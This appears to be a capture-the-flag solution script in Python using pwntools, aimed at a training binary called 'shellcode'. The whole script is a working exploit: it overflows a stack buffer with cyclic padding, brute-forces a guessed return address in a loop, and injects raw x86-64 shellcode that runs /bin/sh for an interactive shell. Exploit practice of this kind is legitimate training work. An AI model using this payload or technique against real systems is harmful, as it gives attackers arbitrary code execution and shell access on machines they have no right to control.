from pwn import *
import binascii
# context.terminal = [ 'tmux', 'splitw' , '-h']
HOST = "training.jinblack.it"
PORT = 2001
if args.REMOTE:
    r = remote(HOST, PORT)


stack = 0x7ffee0b04000
while (True):
    r = process("./shellcode")    
    r.recvuntil("What is your name?")
    shellcode = b"\xEB\x14\x5F\x48\x89\xFE\x48\x83\xC6\x08\x48\x89\xF2\x48\xC7\xC0\x3B\x00\x00\x00\x0F\x05\xE8\xE7\xFF\xFF\xFF"
    shellcode += b"/bin/sh\x00"
    shellcode += b"\x00"*8
    payload = cyclic(1016) + p64(stack) + shellcode 

    r.send(payload)
    # r.send(b"A"*8)
    r.interactive()
    stack += 0x10